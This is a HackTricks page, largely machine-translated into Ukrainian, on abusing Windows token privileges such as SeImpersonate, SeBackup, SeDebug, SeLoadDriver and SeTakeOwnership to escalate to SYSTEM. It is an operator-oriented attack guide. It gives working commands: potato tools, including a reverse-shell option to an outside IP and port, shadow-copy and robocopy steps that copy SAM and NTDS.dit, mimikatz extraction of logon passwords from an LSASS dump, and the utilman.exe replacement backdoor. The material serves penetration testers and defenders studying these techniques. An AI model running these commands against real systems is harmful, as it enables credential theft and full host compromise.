# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

If you **don't know what are Windows Access Tokens** read this page before continuing:


{{#ref}}
access-tokens.md
{{#endref}}

**Maybe you could be able to escalate privileges abusing the tokens you already have**

### SeImpersonatePrivilege

This is privilege that is held by any process allows the impersonation (but not creation) of any token, given that a handle to it can be obtained. A privileged token can be acquired from a Windows service (DCOM) by inducing it to perform NTLM authentication against an exploit, subsequently enabling the execution of a process with SYSTEM privileges. This vulnerability can be exploited using various tools, such as [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires winrm to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Це дуже схоже на **SeImpersonatePrivilege**, воно використовує **той самий метод** для отримання привілейованого token.\
Потім цей privilege дозволяє **призначити primary token** новому/зупиненому процесу. За допомогою привілейованого impersonation token можна похідно отримати primary token (DuplicateTokenEx).\
З token можна створити **новий процес** через 'CreateProcessAsUser' або створити процес у стані suspended і **встановити token** (загалом, не можна змінювати primary token процесу, що вже працює).

### SeTcbPrivilege

Якщо у вас увімкнено цей token, ви можете використати **KERB_S4U_LOGON** для отримання **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну групу** (admins) до token, встановити **integrity level** token на "**medium**", і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує system **надавати повний read access** до будь-якого file (лише для read operations). Його використовують для **читання password hashes локальних Administrator** accounts із registry, після чого можна використовувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (Pass-the-Hash technique). Однак цей technique не працює за двох умов: коли Local Administrator account вимкнено, або коли діє policy, що забирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай **VSS + `robocopy /b`**: створіть/відкрийте shadow copy, а потім скопіюйте `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ви можете **abuse this privilege** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- слідуючи **IppSec** у [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Або як пояснено в розділі **escalating privileges with Backup Operators** з:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Цей privilege надає permission на **write access** до будь-якого системного файлу, незалежно від Access Control List (ACL) файлу. Це відкриває численні можливості для escalation, зокрема можливість **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний permission, особливо корисний, коли користувач має можливість impersonate tokens, а також навіть без SeImpersonatePrivilege. Ця можливість базується на здатності impersonate token, який представляє того самого користувача і чий integrity level не перевищує integrity level поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можливо використати SeCreateTokenPrivilege для EoP, impersonate tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб цільовий token належав тому самому користувачу та мав integrity level, менший або рівний integrity level процесу, що намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і підсилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей privilege дозволяє **load and unload device drivers** шляхом створення запису в registry зі специфічними значеннями `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість слід використати `HKCU` (HKEY_CURRENT_USER). Однак, щоб kernel міг розпізнати `HKCU` для налаштування driver, потрібно дотриматися певного шляху.

Сучасне offensive use зазвичай — це **BYOVD** (bring your own vulnerable driver): завантажити **signed but vulnerable** kernel driver, а потім використати його IOCTLs, щоб вимкнути захист або перейти до kernel code execution. Майте на увазі, що в новіших збірках Windows 11/Server **Microsoft vulnerable driver blocklist** та/або **HVCI/Memory Integrity** часто ламають старі публічні ланцюжки, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` увесь цей шлях потрібно створити, і треба встановити два значення:

- `ImagePath`, який є шляхом до binary, що буде виконано
- `Type`, зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Отримати доступ до `HKCU` замість `HKLM` через обмежений write access.
2. Створити шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` всередині `HKCU`, де `<RID>` представляє Relative Identifier поточного користувача.
3. Встановити `ImagePath` на шлях виконання binary.
4. Призначити `Type` як `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим privilege у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє process **assume ownership of an object**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес полягає спочатку в отриманні ownership цільового registry key для запису, а потім у зміні DACL, щоб увімкнути операції запису.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Ця привілея дозволяє **debug other processes**, зокрема читати та записувати в memory. З цією привілеєю можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention рішень.

На сучасному Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні tokens, але це **не** гарантує, що ви зможете взаємодіяти з **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або inject у LSASS навіть якщо `SeDebugPrivilege` присутня. У такому разі вкрадіть token з іншого non-PPL SYSTEM process або поєднайте це з PPL bypass/BYOVD замість того, щоб припускати, що `procdump` спрацює. Для повного прикладу копіювання token з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) із [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може стосуватися process **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання облікових даних користувача після успішного входу в систему.

Потім ви можете завантажити цей dump у mimikatz, щоб отримати passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати shell `NT SYSTEM`, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, `\\.\C:`) для direct disk I/O, що обходить NTFS ACLs. З ним ви можете копіювати байти будь-якого файлу на томі, читаючи underlying blocks, що дає змогу виконувати arbitrary file read чутливих даних (наприклад, machine private keys у `%ProgramData%\Microsoft\Crypto\`, registry hives, SAM/NTDS через VSS). Це особливо небезпечно на CA servers, де exfiltrating CA private key дає змогу forge Golden Certificate, щоб impersonate any principal.

Дивіться детальні techniques та mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Токени, що відображаються як Disabled, зазвичай можна увімкнути, тож ви часто можете зловживати як _Enabled_, так і _Disabled_ привілеями.

### Enable All the tokens

Якщо у вас є disabled привілеї, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet привілеїв token доступний за адресою [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи експлуатації привілею для отримання admin session або читання чутливих файлів.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читати чутливі файли за допомогою `robocopy /b` або спеціальних copy helpers, що враховують SeBackup.                                                                                                                                                                                                                                                                 | <p>- Great for `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, and sometimes `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is convenient, but dedicated SeBackup cmdlets/APIs are often more flexible for locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створювати довільний token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Дублювати **non-PPL** SYSTEM token або знімати memory з не protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping is commonly blocked if RunAsPPL/LSA Protection is enabled.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використати **Potato family** / named-pipe impersonation для запуску SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажити signed-but-vulnerable kernel driver (BYOVD)<br>2. Використати driver's IOCTLs, щоб отримати kernel R/W, disable security tooling, або підвищитися до SYSTEM<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers such as <code>szkg64.sys</code> are increasingly blocked on modern Windows by the vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустити PowerShell/ISE з наявним privilege SeRestore.<br>2. Увімкнути privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Маніпулювати token так, щоб вони містили local admin rights. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
